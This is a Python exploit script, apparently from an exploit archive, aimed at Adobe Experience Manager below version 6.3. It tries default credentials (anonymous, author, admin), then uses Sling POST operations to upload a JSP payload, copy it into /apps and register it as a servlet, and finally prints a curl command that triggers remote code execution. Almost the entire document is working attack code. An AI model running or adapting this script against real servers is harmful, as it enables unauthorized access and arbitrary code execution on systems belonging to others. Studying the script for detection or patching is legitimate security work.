# Exploit Author: StaticFlow
# Vendor Homepage: https://www.adobe.com/in/marketing-cloud/experience-manager.html
# Version: < 6.3
import requests
import sys
 
baseUrl = &#039;https://test.com/&#039; #default domain, change here or pass in on command line
credentialList = [[&#039;anonymous&#039;,&#039;anonymous&#039;], [&#039;author&#039;,&#039;author&#039;], [&#039;admin&#039;,&#039;admin&#039;]]
exploit = &#039;rce.jsp&#039; #default file name, must be in same dir as python file or passed in on command line
 
def testLogins():
    for credential in credentialList:
        response = requests.get(baseUrl, auth=(credential[0], credential[1]))
        if(response.status_code == 200):
            return credential
    return False
 
if len(sys.argv) == 2:
    baseUrl = sys.argv[1]
if len(sys.argv) == 3:
    exploit = sys.argv[2]
 
gotCreds = testLogins()
if(gotCreds):
    attackChain = [
        {
            &#039;jcr:primaryType&#039;: (None, &#039;nt:folder&#039;) #create a folder for our exploit
        },
        {
            &#039;exec.jsp&#039;: (&#039;rce.jsp&#039;, open(exploit, &#039;rb&#039;)) #upload the exploit
        },
        {
            &#039;:operation&#039;: (None, &#039;copy&#039;), #copy exploit folder over to app folder for staging
            &#039;:dest&#039;: (None, &#039;/apps/rcetype&#039;)
        },
        {
            &#039;sling:resourceType&#039;: (None, &#039;rcetype&#039;) #instruct Apache Sling to initialize our exploit code as a servlet
        }
    ]
    print "creating folder structure and uploading exploit"
    for attack in attackChain[:-1]:
        response = requests.post(baseUrl+&#039;content/rcetype&#039;, files=attack, auth=(gotCreds[0], gotCreds[1]))
        if response.status_code > 201:
            print "Something went wrong, request returned a "+str(response.status_code)+". Here&#039;s the response:"
            print response.content
            sys.exit(0)
 
    print "initializing servlet from exploit"
    response = requests.post(baseUrl+&#039;content/rce&#039;, files=attackChain[-1], auth=(gotCreds[0], gotCreds[1]))
    if response.status_code > 201:
        print "Something went wrong, request returned a "+str(response.status_code)+". Here&#039;s the response:"
        print response.content
        sys.exit(0)
    print """Should be good to go, run &#039;curl -X "GET" -u {}:{} {}&#039; and your exploit should run""".format(gotCreds[0],gotCreds[1],baseUrl+&#039;content/rce.exec&#039;)

